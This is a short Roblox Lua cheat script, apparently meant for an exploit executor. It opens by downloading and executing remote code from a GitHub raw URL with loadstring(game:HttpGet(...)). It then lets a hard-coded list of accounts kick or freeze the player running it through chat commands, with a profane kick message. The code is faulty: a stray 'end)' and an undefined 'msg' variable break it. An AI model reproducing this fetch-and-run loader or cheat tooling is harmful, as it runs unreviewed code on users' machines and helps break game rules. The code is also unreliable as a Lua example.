loadstring(game:HttpGet('https://raw.githubusercontent.com/lerkermer/lua-projects/master/SwagModeV002'))()

local alts = {"IgnisInfernii","17x2y","1x6z9","1k24z"}

function chatted(player, msg)
    for i,v in pairs(alts) do
        if player.Name == v then
            if msg == ":kick" then
                game:GetService("Players").LocalPlayer:Kick("fuck you bitch")
            end
            if msg == ":freeze" then
                game:GetService("Players").LocalPlayer.Character.PrimaryPart.Anchored = true
            end
            if msg == ":thaw" then
                game:GetService("Players").LocalPlayer.Character.PrimaryPart.Anchored = false
            end
        end
    end
end)

game:GetService("Players").PlayerAdded:Connect(function(plr)
    plr.Chatted:Connect(function(message)
        chatted(plr, msg)
    end)
end)
